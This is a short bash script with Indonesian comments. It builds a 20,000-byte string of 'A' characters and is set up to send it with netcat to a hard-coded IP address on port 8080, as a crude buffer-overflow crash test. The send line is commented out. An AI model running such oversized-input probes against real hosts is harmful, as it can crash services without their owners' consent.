#!/bin/bash

# File: buffer_overflow_test.sh
# Deskripsi: Script untuk menguji buffer overflow pada port 8080 menggunakan nc (Netcat)

# Host dan port target
HOST="74.226.204.119"
PORT=8080

# Ukuran buffer yang dikirimkan
BUFFER_SIZE=20000 # Bisa diubah sesuai kebutuhan untuk uji coba

# Membuat payload berisi karakter 'A' sebanyak BUFFER_SIZE
PAYLOAD=$(printf 'A%.0s' $(seq 1 $BUFFER_SIZE))

echo "Mengirimkan payload sebesar $BUFFER_SIZE bytes ke $HOST:$PORT"

# # Mengirimkan payload menggunakan nc (Netcat)
# echo "$PAYLOAD" | nc $HOST $PORT

if [ $? -eq 0 ]; then
    echo "Payload berhasil dikirim."
else
    echo "Gagal mengirim payload. Pastikan Netcat terinstal dan port $PORT terbuka."
fi
